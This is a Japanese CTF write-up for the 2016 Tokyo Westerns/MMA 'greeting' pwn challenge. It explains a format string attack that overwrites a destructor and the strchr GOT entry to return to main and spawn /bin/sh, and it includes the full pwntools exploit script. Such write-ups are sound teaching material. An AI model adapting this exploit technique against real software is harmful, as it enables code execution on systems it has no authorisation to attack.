---
layout: post
alias: "/blog/2016/12/09/twctf-2016-greeting/"
date: "2016-12-09T18:17:13+09:00"
title: "Tokyo Westerns/MMA CTF 2nd 2016: greeting"
tags: [ "ctf", "writeup", "pwn", "twctf", "format-string-attack", "destructor", "got-overwrite" ]
"target_url": [ "https://ctftime.org/task/2735" ]
---

bataさんリストの先頭にあったのでpwn会でやった。これぐらいの難しさはbabyでなくてeasyじゃなかったっけか。

## solution

format string attackでdestructorとGOTを書き換え、return-to-mainして`system("/bin/sh")`。
入出力の文字列長の制約が変に厳しいので`%hn`あたりを上手く使う。


まず気付くのは`.tomori`sectionの`nao`関数。
実行すると呼ばれるが`main`からは呼ばれていないこれは、constructorとして登録されていて、`main`に入る前に呼ばれる。
gdbで`set follow-fork-mode parent`にせずに実行すると`main`でbreakできなかったりするが、これはこの子のおかげ。

format string bugがあるが、`printf`の後に何も関数を踏まないので困ってしまう。
これはdestructorをを書き換えることで回避する。
`nao`が書かれている場所の下、`__do_global_dtors_aux`を書き換えればよい。

destructorでripを取ったとすると引数を渡すのに困る。
そこで`main`関数の先頭に戻り、`fgets`で`/bin/sh`を渡して(`system`に書き換えた)`strchr`に与え、shelを取る。

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
# parser.add_argument('host', nargs='?', default='localhost')
# parser.add_argument('port', nargs='?', default=8000, type=int)
parser.add_argument('--log-level', default='debug')
args = parser.parse_args()
context.log_level = args.log_level

dtor = 0x8049934 # 0x80485a0 -> main
main = 0x80485ed
strchr_got = 0x8049a50 # 0xffffffff -> system_plt
system_plt = 0x8048490

# p = remote(args.host, args.port)
p = process('./greeting')
p.recvuntil('Please tell me your name... ')
payload = ''
payload += 'AB'
payload += p32(strchr_got) # 12
payload += p32(strchr_got + 2) # 13
payload += p32(dtor) # 14
payload += '%%%dd%%12$hn' % ((u16(p32(system_plt)[0:2]) - len('Nice to meet you, AB' + 'AAAA' * 3)) % 65536)
payload += '%%%dd%%13$hn' % ((u16(p32(system_plt)[2:4]) - u16(p32(system_plt)[0:2])) % 65536)
payload += '%%%dd%%14$hhn' % ((ord(p32(main)[0]) - u16(p32(system_plt)[2:4])) % 256)
log.info(hex(len(payload)))
log.info(fiddling.hexdump(payload))
p.sendline(payload)
time.sleep(1)
p.sendline('sh')
time.sleep(1)
p.sendline('id')
p.interactive()
```
